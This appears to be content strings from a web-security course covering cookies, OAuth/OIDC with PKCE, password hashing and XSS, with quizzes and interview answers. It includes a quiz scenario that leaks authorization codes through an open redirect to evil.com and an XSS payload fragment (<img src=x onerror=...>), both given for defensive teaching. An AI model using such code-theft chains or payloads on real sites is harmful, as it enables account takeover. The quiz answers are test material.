diagrams.title: Does the browser attach the cookie?
diagrams.caption: What to notice: Secure and SameSite decide whether the cookie travels; HttpOnly decides whether JavaScript can see it. With SameSite=None every cross-site request carries the cookie again, so CSRF defences must take over.

codeCheck.detail: Login set __Host-sid (HttpOnly, Secure, SameSite=Lax, Path=/, no Domain), a 43-char base64url id, new on each login; strict tough-cookie accepted it and rejected the qs3 cookie with Domain.

one: OAuth 2.0 lets an app get limited access to a user's account elsewhere without their password. OIDC adds a standard login layer on top ("Sign in with Google").
an: A hotel gives a valet a key that only starts the car, not the one that opens the trunk and glovebox. OAuth hands out valet keys.
how: Authorization Code flow with PKCE (the one to use for web, SPA and mobile): app redirects to the provider → user consents → provider redirects back with a one-time code → app exchanges the code (plus the PKCE verifier) for tokens. RFC 9700 recommends PKCE for confidential (server-side) clients too.
Access token: calls APIs, short-lived, limited by scopes. Refresh token: gets new access tokens. ID token (OIDC): a JWT saying who the user is; it is meant for your app, not for calling APIs.

Client credentials flow: machine-to-machine, no user involved. The OAuth 2.0 Security Best Current Practice (RFC 9700, January 2025) says the implicit flow should not be used and the password grant must not be used; the OAuth 2.1 draft removes both.
why: Social login, "connect your Google Calendar", and single sign-on in companies all run on this.
trade: Hand-rolling it is error-prone (state parameter, redirect URI validation, token storage). Use well-tested libraries or providers (Auth.js, Clerk, Auth0, Supabase Auth, Keycloak).

myth.r: OAuth is about authorization (delegated access). OIDC is the identity/authentication layer built on it.

q.s: Which flow should a single-page app or mobile app use with a modern provider?
o: Implicit flow
Authorization Code with PKCE
Resource owner password flow
Client credentials
q.e: PKCE protects the code exchange for public clients that cannot keep a secret.

more: The state parameter and CSRF on the callback
SSO for companies: SAML vs OIDC
lab: Implement "Sign in with GitHub" by hand (no library) once: redirect, callback, code exchange, fetch the user. Then replace it with a library.
Read Google's discovery document at accounts.google.com/.well-known/openid-configuration and identify the auth, token and JWKS endpoints.

plain:
OAuth lets one app get limited access to your account on another service without knowing your password. “Allow this app to read your Google Calendar” is OAuth.

OpenID Connect (OIDC) is built on top of it and answers “who is this user?”. “Sign in with Google” is OIDC.
bridge: When you add “Sign in with GitHub” using Supabase Auth, NextAuth/Auth.js or Clerk, the library runs this whole flow for you. Knowing the steps helps when the callback fails with a cryptic error.

walk.title: “Sign in with Google”, step by step
steps: User clicks the button. Your app redirects to Google with your client ID, the redirect URL, the scopes (“email profile”), a random state and a PKCE challenge.
The user logs in at Google (your app never sees the password) and agrees.
Google redirects back to your callback URL with a short-lived code and the same state.
Your server checks state matches, then exchanges the code (plus the PKCE verifier) for tokens directly with Google.
The ID token says who the user is. You create or find the user in your database and start your own session.

terms: A standard for delegated access (permission to act on your behalf).
OpenID Connect: identity/login on top of OAuth.
A one-time code exchanged for tokens.
An extra check that stops stolen codes from being used.
insights: Redirect URLs must be exact matches; loose matching lets attackers steal codes.
After OIDC login, you still create your own session. The provider's tokens are not your app's session.
Ask for the smallest scopes at login and request more only when a feature needs them. Small consent screens are trusted by users and pass provider reviews faster.

prod.summary: In production you almost never write the OAuth flow yourself; you configure a library or provider and own the edges: exact redirect URIs, the callback handler, token storage, and what happens when a token is revoked. Seniors check that the callback validates state and PKCE, that ID tokens are verified (issuer, audience, nonce), and that the app creates its own session instead of passing provider tokens to the browser.
checklist: Redirect URIs are registered as exact strings (no wildcards), one per environment.
state (or the library's equivalent) and PKCE (S256, not plain) are on for every client, including server-side ones.
The ID token is verified: signature via JWKS, iss, aud equals your client ID, exp, and nonce when used.
Users are linked by the provider's stable sub (plus issuer), not by email; email can change or be unverified.
Scopes are minimal (openid email profile), and extra scopes are asked for later, when the feature needs them.
Provider refresh tokens are stored encrypted server-side; the browser only gets your own session cookie.
Client secrets live in a secret manager and are rotated; mobile and SPA apps have no secret at all (public clients).
numbers: RFC 7636 (PKCE): the code verifier is 43–128 characters; the S256 method sends BASE64URL(SHA256(verifier)) as the challenge.
RFC 9700 (January 2025) is the OAuth 2.0 Security Best Current Practice: no implicit grant, no password grant, exact redirect URI matching, PKCE recommended for all clients.
Google's authorization codes are single-use; a second exchange of the same code fails with invalid_grant.
failures: Callback fails with redirect_uri_mismatch only in production.

The registered URI differs by one detail: http vs https, a trailing slash, www, or the proxy rewriting the host. Register the exact production URL and make the app build it from config, not from the request host.
Token exchange returns invalid_grant for some users.

The code was used twice (double-click, retry middleware, React strict-mode double effect) or expired (codes live seconds to minutes), or the PKCE verifier from a different tab was used. Make the callback idempotent and store the verifier per state.
Two different people end up in the same account.
Accounts were linked by email from a provider that allows unverified emails. Link by iss + sub, and only auto-link emails with email_verified: true from trusted providers.
After a user revokes access in their Google account, background sync keeps failing with 400s every minute.
Refresh returns invalid_grant after revocation. Detect it, mark the connection as disconnected, stop retrying and ask the user to reconnect.

code.title: Callback handler with openid-client v6
code.note: Users are found by iss + sub, not by email, and the app starts its own session; Google's tokens never reach the browser.

qs.s: Your app registers the redirect URI https://app.example.com/* with a provider that allows wildcards. You also have an open redirect at /go?to=. What can an attacker do?
o: Nothing, the code needs the client secret
Only phish the user's password
Send the user to an authorize URL whose redirect is /go?to=https://evil.com, so the authorization code leaks to the attacker
Bypass PKCE on server-side clients
qs.e: Loose redirect matching plus an open redirect is a classic code-theft chain. Exact redirect URIs close it. PKCE also helps, but RFC 9700 still requires exact matching.

qs.s: A backend receives an OIDC ID token from the mobile app and uses email from it after checking only the signature. Which missing check lets a token issued to another app on the same provider log in?
o: The aud (audience) check against your client ID
The iat check
The at_hash check
Nothing; a valid signature from Google is enough
qs.e: The provider signs ID tokens for every client. Without the audience check, any app that gets a user's ID token for itself can replay it at your API.

qs.s: A cron service needs to call your billing API every hour. No user is involved. Which OAuth flow fits?
o: Authorization Code with PKCE using an admin's account
Resource owner password grant with a service user
Implicit flow
Client credentials, with a token scoped only to the billing endpoints it needs
qs.e: Client credentials is the machine-to-machine flow. Using a human admin account ties the job to a person and gives far too much access.

qs.s: A code review finds this authorization request in an SPA. What should change?

code.title: Authorization request
code.src:
GET /authorize?response_type=token
    &client_id=spa-web
    &redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback
    &scope=openid%20profile%20orders%3Awrite HTTP/1.1
Host: auth.example.com

o: Nothing; SPAs cannot keep a secret, so the token flow is the right one
Add a client secret to the URL
Only add a state parameter
This is the implicit flow: the access token comes back in the URL fragment, where history, extensions and logs can see it. Use response_type=code with PKCE (code_challenge_method=S256) and state
qs.e: RFC 9700 says the implicit grant should not be used. Authorization Code + PKCE works for public clients without a secret: a stolen code is useless without the verifier. A secret in an SPA is public by definition. state is needed, but alone it does not fix token leakage.

qs.s: Your SPA uses Authorization Code + PKCE and gets a refresh token. Security wants the strongest common design for a high-value app. What is it?
o: A backend-for-frontend (BFF): your server does the OAuth flow, keeps access and refresh tokens server-side, and the browser only has an HttpOnly session cookie
Keep tokens in localStorage, encrypted with a key stored in the bundle
Keep the refresh token in sessionStorage; it is cleared when the tab closes
Ask for a 30-day access token so no refresh token is needed
qs.e: Anything JavaScript can read, XSS can read; an encryption key shipped in the bundle protects nothing. With a BFF, tokens never reach the browser and the cookie gets the usual HttpOnly, Secure, SameSite protections. Long access tokens make theft worse, not better.

qs.s: In OIDC login, what does the nonce parameter protect against, compared with state?
o: Both do the same thing; send one of them
nonce encrypts the ID token

state ties the callback to the browser that started login (CSRF on the callback); nonce is copied into the ID token so your app can reject an ID token that was issued for a different login (replay or injection)
nonce replaces PKCE for public clients
qs.e: state is checked on the redirect; nonce is checked inside the signed ID token. Libraries like openid-client check both when you pass expectedState and expectedNonce. PKCE protects the code exchange; it is a third, separate check.

qs.s: A worker calls the billing API for every job. At 300 jobs per second, the identity provider starts returning 429 Too Many Requests and billing calls fail. What is the fix?

code.title: billing-client.ts

o: Ask the provider to raise the rate limit
Cache the token in memory until shortly before expires_in runs out, refresh it with a single in-flight request, and retry once on a 401
Switch to a token that never expires
Call the token endpoint in parallel to make it faster
qs.e: A client-credentials token is valid for its whole lifetime (often an hour). Fetching one per call multiplies load on the IdP by your request rate. Cache it, refresh early (for example 60 seconds before expiry), and make concurrent callers share one refresh. Non-expiring tokens remove your ability to revoke.

interview.q: Explain the Authorization Code flow with PKCE. Which attack does each piece stop?
answer: Redirect to the provider with client ID, exact redirect_uri, scopes, state, nonce (OIDC) and code_challenge = BASE64URL(SHA256(verifier)).
Exact redirect URI matching: stops codes being sent to an attacker's URL.
state: stops CSRF on the callback (an attacker's code being injected into the victim's browser).
Short-lived, single-use code exchanged on a back channel: tokens never travel in the URL.
PKCE verifier: a stolen code cannot be exchanged without the secret verifier that only the initiating client has.
nonce and ID token checks (signature, iss, aud, exp): stop forged or replayed identity tokens.
followups: Why does RFC 9700 recommend PKCE for confidential clients too?
What does the provider store between the two steps?

interview.q: Where should an SPA keep OAuth tokens? Compare the options.
answer: localStorage/sessionStorage: simple, survives reloads, but any XSS can read and send them away.
In-memory only: XSS cannot read old tokens after a reload, but it can still use the app while it runs; you need a silent renew (refresh token rotation or a session at the IdP).
Backend-for-frontend: tokens stay on your server, browser gets an HttpOnly cookie; strongest, costs a server and CSRF protection.
Refresh tokens in the browser must rotate with reuse detection, or be sender-constrained (DPoP).
Choice depends on risk: banking or admin apps should use a BFF; low-risk tools can use in-memory tokens.
followups: What is DPoP and what does it add?
How does a BFF handle CSRF?

interview.q: We have email/password accounts and want to add “Sign in with Google” and GitHub. How do you link accounts safely?
answer: Identify external accounts by (issuer, sub), stored in a separate identities table; never by email alone.

Auto-link to an existing account only if the provider asserts a verified email you trust (Google's email_verified); otherwise ask the user to log in to the existing account first and link from settings.
GitHub's primary email may be unverified or private; fetch the verified emails list and handle “no verified email”.
Linking and unlinking are sensitive actions: require recent authentication, notify the user by email.
Keep at least one login method; do not let a user unlink the last one.
followups: What happens when the user changes their Google email?
How would you handle a company domain moving to SSO?

diagrams.title: Authorization Code flow with PKCE (“Sign in with Google”)
diagrams.src:
sequenceDiagram
  participant U as User browser
  participant App as Your server
  participant G as Google
  U->>App: click “Sign in with Google”
  App->>App: create state + PKCE verifier, keep in session
  App-->>U: redirect to Google (client ID, scopes, state, challenge)
  U->>G: log in and consent
  Note over U,G: the password goes to Google only
  G-->>U: redirect to callback with code + state
  U->>App: GET /auth/callback with code and state
  App->>App: state matches the session?
  App->>G: exchange code + PKCE verifier
  G-->>App: ID token + access token
  App->>App: verify ID token, find user by iss + sub
  App-->>U: your own session cookie
diagrams.caption: What to notice: the code passes through the browser, but it is useless without the PKCE verifier, which never left your server. The flow ends with your session cookie; Google's tokens stay on the server.

one: Store passwords with a slow, salted, purpose-built hash (Argon2id, bcrypt, scrypt). Never encrypt them, never use plain SHA-256.
an: Instead of keeping everyone's keys, you keep a mould of each key that cannot be turned back into a key, and making each mould takes deliberate effort.
how: A salt (random per user) means identical passwords produce different hashes and precomputed rainbow tables are useless.
Slow by design (tunable cost): a login takes ~100ms, which is nothing for one user and crippling for an attacker trying billions of guesses.
Add rate limiting, breached-password checks, MFA, and consider passkeys, which remove passwords entirely.
why: Databases leak. With proper hashing, a leak exposes few real passwords; with MD5/SHA-1, most are cracked in hours.
trade: Higher cost factors mean more CPU per login; tune to your hardware and revisit over time.

myth.m: SHA-256 is secure, so it is fine for passwords.
myth.r: It is designed to be fast. GPUs compute billions per second. Password hashing must be slow.

o: AES-encrypted passwords
SHA-256(password)
Argon2id with a per-user salt
Plain text in a private DB
q.e: Encryption is reversible if the key leaks; fast hashes are brute-forceable.

more: Pepper (a server-side secret added to hashing)
Rehashing on login when parameters change
lab: Hash a password with argon2 in Node; time verification; increase memory cost and time again.
Use the Have I Been Pwned range API to check a password by sending only the first 5 hash characters.
Try passkeys on a demo site (webauthn.io) and read what the browser sends.

plain:
Never store passwords themselves. Store a hash: a one-way fingerprint. At login, hash what the user typed and compare. Even you cannot read the original password.

Use a hash designed for passwords (Argon2id or bcrypt): it is slow on purpose and adds a random salt per user, so stolen hashes are very hard to crack.
bridge: Auth providers like Supabase and Clerk do this for you. If you ever write your own login, this is the part you must not improvise.

walk.title: Why slow hashing matters after a leak
steps: An attacker steals your users table with 100,000 password hashes.
If you used plain SHA-256: one gaming GPU tries billions of guesses per second. Most common passwords are found within hours.
If you used bcrypt or Argon2id with a sensible cost: the same GPU manages only thousands of guesses per second instead of billions, a slowdown of about a million times.
Because each user has a different salt, the attacker cannot crack all users at once; every account must be attacked separately.
Weak passwords (like “123456”) still fall, but most users' passwords stay safe long enough for you to force resets.

terms: A one-way fingerprint of data; cannot be reversed.
A random value added per user so equal passwords get different hashes.
Hash functions designed to be slow for passwords.
Login with a device-held key instead of a password.
insights: Encryption is also wrong for passwords: if the key leaks, every password is readable.
Cost parameters age. Re-measure login time on current hardware every year or two and raise them; old hashes upgrade at the next login.

The login endpoint is the attack surface, not only the hash. Credential stuffing uses correct passwords leaked from other sites, so rate limits, breached-password checks and MFA matter as much as the algorithm.

prod.summary: In production, password storage is a solved problem that teams still get wrong at the edges: cost parameters set once in 2018 and never raised, a 72-byte bcrypt limit nobody knew about, login endpoints without rate limits, and password rules that NIST no longer recommends. Seniors check the algorithm and parameters, the upgrade path for old hashes, and the login endpoint's abuse controls.
checklist: Algorithm and parameters meet the OWASP minimums (Argon2id m=19 MiB, t=2, p=1, or bcrypt cost 10+), and login takes roughly 100–500 ms on production hardware.
Hashes store their parameters (PHC string $argon2id$v=19$m=…) and are re-hashed on successful login when parameters change.
bcrypt inputs over 72 bytes are handled (bcrypt silently ignores the rest), or you use Argon2id.
New passwords are checked against a breached-password list (e.g. HIBP range API, sending only 5 hash characters).
No composition rules or forced periodic changes (NIST SP 800-63B-4); minimum length 15 if the password is the only factor.
Login and reset endpoints have per-account and per-IP rate limits, and failures return the same message and similar timing for unknown users.
Hashing runs off the main thread (the Node argon2/bcrypt packages use the libuv thread pool); watch thread pool size under load.
numbers: OWASP Password Storage Cheat Sheet: Argon2id with at least 19 MiB memory, 2 iterations, parallelism 1; bcrypt work factor at least 10; PBKDF2-HMAC-SHA256 at 600,000 iterations if FIPS is required.
bcrypt only uses the first 72 bytes of input.
NIST SP 800-63B-4 (2025): single-factor passwords at least 15 characters (8 when used with MFA); allow at least 64; no composition rules; no periodic rotation without evidence of compromise.
Node's libuv thread pool defaults to 4 threads (UV_THREADPOOL_SIZE), which caps parallel hashes per process.
failures: Login p99 jumps from 200 ms to 4 s during a marketing campaign; CPU is at 100%.

Each login costs real CPU by design, and only 4 hashes run in parallel per process. Rate-limit login, scale the auth service separately, raise UV_THREADPOOL_SIZE carefully, and do not lower the cost as a quick fix.
A pentester logs in with only the first 72 characters of a long passphrase.
bcrypt truncates at 72 bytes. Move to Argon2id (re-hash on next login) or reject passwords longer than 72 bytes when using bcrypt.
Credential-stuffing: thousands of logins per minute from many IPs, ~1% succeed.
Attackers reuse leaked passwords from other sites. Add per-account throttling, bot detection, breached-password checks on login, and push MFA or passkeys.
Security audit: “passwords hashed with unsalted SHA-1 in legacy table”.
Wrap them now: store argon2id(sha1hash) for all rows at once, then replace with plain argon2id(password) at each user's next login. Do not wait for users to log in to stop exposing SHA-1.

code.title: Argon2id with OWASP parameters and re-hash on login (node-argon2)
code.note: node-argon2 documents the namespace import (import * as argon2). Its own defaults (m=64 MiB, t=3, p=4) are stronger than this minimum, and needsRehash compares against exactly the values you pass, so a stronger old hash would be “upgraded” down; keep PARAMS as your real target.

qs.s: Login with Argon2id takes 300 ms. During a credential-stuffing attack, your Node auth service hits 100% CPU and real users time out. A teammate proposes lowering memoryCost and timeCost to make logins faster. Best response?
o: Agree, speed matters more
Switch to SHA-256 temporarily
Keep the cost; add per-IP and per-account rate limiting and bot protection at the edge, and scale the auth service
Cache successful password checks for an hour
qs.e: The cost is what protects users if the DB leaks. The attack is a traffic problem, so solve it with rate limits and capacity. Caching password checks creates a new attack surface.

qs.s: You use bcrypt. A user registers with a 100-character passphrase. Later, someone logs in with only its first 72 characters. Why does it work?
o: bcrypt only uses the first 72 bytes of input, so both passwords give the same hash
bcrypt salts are only 72 bits
The database column was too short
The hash was cached
qs.e: This is a known bcrypt limit. Either reject longer inputs or use Argon2id, which has no such limit.

qs.s: A product manager asks for “at least one uppercase, one digit, one symbol, and a forced change every 90 days”. What does NIST SP 800-63B-4 say?
o: Exactly that, plus a 12-character minimum
Only the 90-day rotation is still required
Composition rules are optional but recommended
Do not impose composition rules or periodic changes; require length (15+ for single-factor), check breached lists, and force a change only on evidence of compromise
qs.e: Composition rules and forced rotation push users to predictable patterns (“Summer2026!”). Length plus breach checks gives more real security.

qs.s: Each Argon2id hash takes about 50 ms of CPU on one thread. A Node process has the default UV_THREADPOOL_SIZE. Ignoring everything else, what is the maximum number of logins per second one process can handle?
o: About 20
About 80
About 4
About 1,000, because hashing is async
qs.e: The default libuv pool has 4 threads, and each can finish 1 / 0.05 s = 20 hashes per second: 4 × 20 = 80. “Async” only means the main thread is not blocked; the work still runs on the pool. Note that file system and DNS lookups share the same 4 threads, so heavy login traffic can also slow those.

qs.s: Read this login code. Which problem does a security review flag?

code.title: routes/login.ts

o: Only the different error messages; the timing is the same because both return 401
bcrypt.compare is not constant-time
Nothing; telling users what went wrong is good UX
Account enumeration in two ways: the messages differ, and unknown emails return in about 1 ms while known ones take the bcrypt time. Use one message and compare against a dummy hash for unknown users
qs.e: Attackers use enumeration to build lists for credential stuffing and phishing. The status code being equal does not hide a 100× difference in response time. Note that a sign-up form saying “email already registered” leaks the same thing; protect it with rate limits or an email-based flow.

qs.s: You store password-reset tokens: 32 random bytes from crypto.randomBytes, valid 30 minutes, single use. How should they be stored in the database?
o: Argon2id, like passwords, because they are secrets
Plain text; they expire anyway
A fast hash such as SHA-256 of the token; look up by the hash and delete the row when used
AES-encrypted, so support can read them
qs.e: Slow hashing exists because passwords are guessable. A 256-bit random token cannot be brute-forced, so SHA-256 is enough, and it allows a direct indexed lookup (Argon2id with random salts cannot be looked up). Plain text means a DB read-only leak lets attackers reset any pending account.

qs.s: Your sign-up form checks new passwords against Have I Been Pwned. What does the service learn from this request?

code.title: Request and response
code.src:
GET /range/5BAA6 HTTP/1.1
Host: api.pwnedpasswords.com
Add-Padding: true

HTTP/1.1 200 OK
003D68EB55068C33ACE09247EE4C639306B:<count>
012C192B2F16F82EA0EB9EF18D9D539B0DD:<count>
... several hundred more suffix:count lines ...

o: The password, because the hash prefix can be reversed
Only the first 5 hex characters of the password's SHA-1; hundreds of breached hashes share that prefix, and your server compares the suffixes locally
The full SHA-1 hash of the password
Nothing, because the request uses TLS
qs.e: This is k-anonymity: you send a 5-character prefix, get every suffix in that bucket, and check the match yourself. Add-Padding adds fake entries so response size does not hint at the result. TLS hides the request from the network, not from the service.

interview.q: How would you store passwords in a new system, and how would you migrate an old system that used unsalted SHA-1?
answer: New system: Argon2id with at least OWASP's minimum (19 MiB, t=2, p=1), tuned so a hash takes roughly 100–500 ms on production hardware; or bcrypt cost 10+ with a 72-byte limit check.
Store the PHC string so parameters travel with the hash; re-hash on successful login when parameters change.
Migration: do not wait for logins. Wrap every old hash at once: argon2id(sha1_hex), mark the row as wrapped, and at next login verify via the wrapper, then store a plain argon2id(password).
Force reset for accounts that never log in after a deadline; consider the old hashes already compromised if the DB ever leaked.
Add the controls around it: rate limits, breached-password checks, MFA or passkeys.

interview.q: Our login endpoint is under a credential-stuffing attack right now. Walk me through your response.
answer: Recognise it: high volume of failed logins across many accounts and IPs, success rate around 0.1–2%, residential proxy IPs.
Immediate: per-account and per-IP rate limits, bot challenge at the edge (WAF, Turnstile/reCAPTCHA) on the login route, block known bad ASNs if it helps.
Do not lower hash cost to survive the CPU load; scale the auth service and shed traffic at the edge instead.
Find accounts that were successfully accessed: logins from new devices or IPs during the window. Revoke their sessions and force a password reset; notify them.
Longer term: breached-password checks at login, MFA or passkeys, device/risk signals, alerting on failed-login ratio.
followups: How do you avoid locking out real users with per-account limits?
Which metrics would you alert on?

interview.q: How do you choose Argon2id parameters, and how do you raise them later without breaking anything?
answer: Start from OWASP's equivalent settings (for example m=19 MiB t=2, or m=46 MiB t=1, p=1) and benchmark on production hardware.
Budget: latency per login (100–500 ms) and memory = concurrent hashes × memory cost; at 32 concurrent hashes and 64 MiB each that is 2 GiB.
Make concurrency explicit: thread-pool size, a queue or semaphore in front of hashing, and autoscaling on login rate.
Raise parameters in config; needsRehash upgrades users at their next login, and the PHC string lets old and new hashes coexist.
Load-test the login path after each change and alert on p99 login latency.
followups: Why does memory cost hurt GPU attackers more than time cost?
Would you hash on the client?

one: An attacker gets their JavaScript to run on your site in other users' browsers, usually by injecting it through content you render.
an: Someone slips a forged note into the company newsletter, and every employee who reads it follows its instructions with their own access badge.
how: Stored XSS: a comment containing <img src=x onerror=...> saved in the DB and rendered to every viewer. Reflected: injected via a URL parameter. DOM-based: client JS writes untrusted data into the page.

Frameworks like React escape text by default. Danger zones: dangerouslySetInnerHTML, innerHTML, v-html, user-controlled URLs in href/src (React 19 blocks javascript: URLs, older versions only warned, and plain DOM code does not block them), and rendering user Markdown or HTML without a sanitizer (DOMPurify).
Content Security Policy headers restrict which scripts may run, limiting damage when escaping fails.
why: XSS runs as the victim: it can read localStorage tokens, make API calls with their cookies, and change what they see.
trade: A strict CSP takes work (nonces, no inline scripts) but is the strongest second layer.

myth.r: It escapes text. Raw HTML APIs, URL attributes and third-party scripts are still open doors.

q.s: Users can write bios in Markdown, which you convert to HTML and render with dangerouslySetInnerHTML. What is missing?
o: Nothing
HTML sanitisation (e.g. DOMPurify) after Markdown conversion, ideally plus CSP
A CDN
Rate limiting
q.e: Markdown allows raw HTML. Sanitise with an allowlist before rendering.

Fix with text rendering; then allow limited HTML via DOMPurify.
